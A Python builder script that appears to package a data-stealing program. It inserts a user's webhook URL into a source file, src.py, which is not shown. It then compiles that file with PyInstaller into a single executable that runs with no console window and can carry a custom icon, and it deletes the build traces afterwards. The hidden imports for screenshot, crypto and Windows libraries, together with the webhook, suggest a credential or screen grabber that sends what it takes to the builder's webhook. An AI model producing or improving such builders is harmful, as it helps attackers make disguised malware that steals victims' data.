import subprocess
import os
import shutil

def remove_dirs(filename):
    dirs = ["./build", "./__pycache__"]
    files = [f"{filename}.spec", "filled_script.py"]
    for dir in dirs:
        try:
            shutil.rmtree(dir)
        except:
            pass
    for file in files:
        try:
            os.remove(file)
        except:
            pass

def insert_webhook_and_build_exe(webhook, output_file, icon_path=None):
    with open("src.py", "r") as file:
        content = file.read()

    updated_content = content.replace("{webhook_placeholder}", f'{webhook}')

    with open("filled_script.py", "w") as file:
        file.write(updated_content)

    command = [
        'pyinstaller',
        '--onefile', '--clean', '--noconsole',
        '--hidden-import', 'pyautogui',
        '--hidden-import', 'pycryptodome',
        '--hidden-import', 'pywin32',
        '--hidden-import', 'requests',
        '--name', output_file,
        'filled_script.py'
    ]

    if icon_path:
        command.extend(['--icon', icon_path])

    subprocess.run(command)

    remove_dirs(output_file)


user_webhook = input("Enter your webhook: ")
output_file = input("Enter the output file name (without extension): ")
icon_path = input("Enter the path to your icon file (.ico format), or press Enter to use the default: ")
insert_webhook_and_build_exe(user_webhook, output_file, icon_path if icon_path else None)
